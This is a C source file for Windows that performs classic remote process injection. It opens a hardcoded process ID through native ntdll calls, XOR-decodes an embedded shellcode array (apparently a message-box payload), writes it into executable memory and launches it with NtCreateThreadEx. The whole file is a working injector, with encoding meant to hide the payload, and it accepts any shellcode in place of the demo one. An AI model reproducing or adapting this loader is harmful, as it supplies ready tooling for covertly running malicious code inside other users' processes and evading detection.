#include <Windows.h>
#include <stdio.h>
#include "nativeH.h"

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define error(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)

void xorEncrypt(unsigned char message[], int size, unsigned char key)
{
    for (int i = 0; i < size; i++)
    {
        message[i] ^= key; // Apply XOR encryption
    }
}


int main(void)
{
    HMODULE hDll = GetModuleHandleW(L"ntdll.dll");
    if (hDll == NULL)
    {
        error("Error to get Handle of NTDLL");
        return -1;
    }
    okay("Sucess the handle is [0x%p]", hDll);

    info("Loading functions...");
    NtOpenProcess ntOpenProcess = (NtOpenProcess)GetProcAddress(hDll, "NtOpenProcess");
    NtAllocateVirtualMemory ntAlloc = (NtAllocateVirtualMemory)GetProcAddress(hDll, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory ntWrite = (NtWriteVirtualMemory)GetProcAddress(hDll, "NtWriteVirtualMemory");
    NtCreateThreadEx ntCreateThread = (NtCreateThreadEx)GetProcAddress(hDll, "NtCreateThreadEx");
    NtClose ntClose = (NtClose)GetProcAddress(hDll, "NtClose");
    okay("Loaded all Fuctions");

    unsigned char shellCode[] = {
        "\x56\xe2\x2b\x4e\x5a\x55\x55\x55\x42\x66\xaa\xaa\xaa\xeb\xfb\xeb\xfa\xf8\xe2\x9b\x78\xfb\xcf\xe2\x21\xf8\xca\xe2\x21\xf8\xb2\xe2\x21\xf8\x8a\xfc\xe2\xa5\x1d\xe0\xe0\xe2\x21\xd8\xfa\xe7\x9b\x63\xe2\x9b\x6a\x06\x96\xcb\xd6\xa8\x86\x8a\xeb\x6b\x63\xa7\xeb\xab\x6b\x48\x47\xf8\xe2\x21\xf8\x8a\xeb\xfb\x21\xe8\x96\xe2\xab\x7a\xcc\x2b\xd2\xb2\xa1\xa8\xa5\x2f\xd8\xaa\xaa\xaa\x21\x2a\x22\xaa\xaa\xaa\xe2\x2f\x6a\xde\xcd\xe2\xab\x7a\xee\x21\xea\x8a\xe3\xab\x7a\x21\xe2\xb2\xfa\x49\xfc\xe2\x55\x63\xe7\x9b\x63\xeb\x21\x9e\x22\xe2\xab\x7c\xe2\x9b\x6a\x06\xeb\x6b\x63\xa7\xeb\xab\x6b\x92\x4a\xdf\x5b\xe6\xa9\xe6\x8e\xa2\xef\x93\x7b\xdf\x72\xf2\xee\x21\xea\x8e\xe3\xab\x7a\xcc\xeb\x21\xa6\xe2\xee\x21\xea\xb6\xe3\xab\x7a\xeb\x21\xae\x22\xe2\xab\x7a\xeb\xf2\xeb\xf2\xf4\xf3\xf0\xeb\xf2\xeb\xf3\xeb\xf0\xe2\x29\x46\x8a\xeb\xf8\x55\x4a\xf2\xeb\xf3\xf0\xe2\x21\xb8\x43\xe1\x55\x55\x55\xf7\x42\xa1\xaa\xaa\xaa\xdf\xd9\xcf\xd8\x99\x98\x84\xce\xc6\xc6\xaa\xf3\xeb\x10\xe6\xdd\x8c\xad\x55\x7f\xe3\x6d\x6b\xaa\xaa\xaa\xaa\x42\xb8\xaa\xaa\xaa\xe7\xc5\xc7\x8a\xe3\x8a\xcb\xc7\x8a\xcb\x8a\xe2\xcb\xc9\xc1\xcf\xd8\xaa\xf0\x42\xb8\xaa\xaa\xaa\xe7\xc5\xc7\x8a\xe3\x8a\xcb\xc7\x8a\xcb\x8a\xe2\xcb\xc9\xc1\xcf\xd8\xaa\xeb\xf2\xe2\x9b\x63\xeb\x10\xef\x29\xfc\xad\x55\x7f\xe2\x9b\x63\xeb\x10\x5a\x1f\x08\xfc\x55\x7f"};

    size_t RegionSize = sizeof(shellCode);
    NTSTATUS status = 0;
    HANDLE hProcess;
    OBJECT_ATTRIBUTES oa = {sizeof(oa), NULL};
    CLIENT_ID clid = {(HANDLE)6952, NULL};
    PVOID buffer = NULL;

    status = ntOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &clid);
    if(STATUS_SUCCESS != status)
    {
        error("ntOpenProcess: 0x%X", status);
        return 1;
    }
    okay("Sucess to Open process: ", hProcess);

    xorEncrypt(shellCode, (sizeof(shellCode))-1, 0xAA);

    status = ntAlloc(hProcess, &buffer, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (STATUS_SUCCESS != status)
    {
        error("NtAlloc: 0x%X", status);
        return 1;
    }
    okay("Sucess to Alloc memory ");

    size_t bytesWritten;

    status = ntWrite(hProcess, buffer, shellCode, sizeof(shellCode), &bytesWritten);
    if (STATUS_SUCCESS != status)
    {
        error("ntWrite: 0x%X", status);
        return 1;
    }
    okay("Sucess to Write in memory ");

    HANDLE hThread = NULL;

    status = ntCreateThread(&hThread, THREAD_ALL_ACCESS, &oa, hProcess, (LPTHREAD_START_ROUTINE)buffer, NULL, FALSE, 0, 0, 0, 0);
    if (STATUS_SUCCESS != status)
    {
        error("ntCreateThread: 0x%X", status);
        return 1;
    }
    okay("Sucess to create Thread ");

    info("Closing All Handles...");
    ntClose(hProcess);
    ntClose(hThread);
    ntClose(hDll);
    okay("Program Exiting");

    return 0;
}